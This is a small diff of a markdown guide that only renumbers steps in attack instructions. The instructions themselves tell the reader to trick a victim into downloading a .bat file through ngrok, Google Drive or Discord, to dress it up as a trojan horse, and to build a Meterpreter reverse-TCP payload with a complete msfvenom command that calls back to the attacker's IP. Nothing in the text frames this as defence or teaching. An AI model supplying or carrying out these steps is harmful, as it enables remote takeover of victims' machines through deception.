@@ -4,8 +4,8 @@
 ## Steps:
 
 1. Get victim to download .bat file to their machine, i.e through ngrok server, google drive, discord, or other means.
-1. - Make it convincing by turning it into a trojan horse.
-2. Generate the payload: <br>
+ - Make it convincing by turning it into a trojan horse.
+3. Generate the payload: <br>
 Using meterpreter here, but feel free to play around with it. <br>
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=[YOUR_IP] LPORT=4444 -a x86 -f exe -o [FILE_NAME.exe]
 
